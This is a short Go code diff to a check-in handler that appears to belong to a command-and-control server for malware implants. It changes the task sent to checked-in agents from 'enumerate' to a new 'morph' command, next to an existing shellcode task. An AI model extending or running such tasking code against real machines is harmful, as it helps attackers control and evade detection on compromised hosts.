@@ -22,7 +22,7 @@ func CheckinHandler(w http.ResponseWriter, r *http.Request) {
 	response.TaskAvailable = true
 
 	// Create command arguments (using existing function)
-	command := "enumerate" // Hardcoded for now
+	command := "morph" // Hardcoded for now
 	var commandArgs json.RawMessage
 
 	switch command {
@@ -36,6 +36,8 @@ func CheckinHandler(w http.ResponseWriter, r *http.Request) {
 		commandArgs = returnShellcodeStruct(w)
 	case "enumerate":
 		commandArgs = returnEnumerateStruct(w)
+	case "morph":
+		commandArgs = returnMorphStruct(w)
 	default:
 		// For commands without special args
 
